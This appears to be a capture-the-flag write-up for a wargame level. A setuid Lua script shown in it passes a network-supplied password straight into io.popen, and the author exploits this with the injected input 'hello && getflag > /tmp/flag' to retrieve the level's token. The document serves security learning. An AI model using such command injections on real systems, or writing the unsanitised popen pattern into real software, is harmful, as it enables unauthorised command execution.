In this level, we have a `setuid` Lua script :

```
#!/usr/bin/env lua
local socket = require("socket")
local server = assert(socket.bind("127.0.0.1", 5151))

function hash(pass)
  prog = io.popen("echo "..pass.." | sha1sum", "r")
  data = prog:read("*all")
  prog:close()

  data = string.sub(data, 1, 40)

  return data
end


while 1 do
  local client = server:accept()
  client:send("Password: ")
  client:settimeout(60)
  local l, err = client:receive()
  if not err then
      print("trying " .. l)
      local h = hash(l)

      if h ~= "f05d1d066fb246efe0c6f7d095f909a7a0cf34a0" then
          client:send("Erf nope..\n");
      else
          client:send("Gz you dumb*\n")
      end

  end

  client:close()
end
```

If we try to `./level11` : 
> lua: ./level11.lua:3: address already in use   
stack traceback:   
	[C]: in function 'assert'   
	./level11.lua:3: in main chunk   
	[C]: ?

The port 5151 is already listening. So we can't execute the script juste like
that.   

If we try to connect on port localhost 5151 : `nl localhost 5151` or 
`telnet localhost 5151` : 
> Password :

If we look again at the script, we notice this :   
`  prog = io.popen("echo "..pass.." | sha1sum", "r")`

In Lua programming, `io.popen` executes a command system and then makes use of whatever
is returned by that command.

So, as a password, we can try this : 

> Password : "hello && getflag > /tmp/flag"

Now, if we `cat /tmp/flag` : 
> Check flag.Here is your token : fa6v5ateaw21peobuub8ipe6s
X

# Sources :

About io.popen function : 
- https://stackoverflow.com/questions/31889197/what-is-the-purpose-of-io-popen-function
- https://www.tutorialspoint.com/io-popen-function-in-lua-programming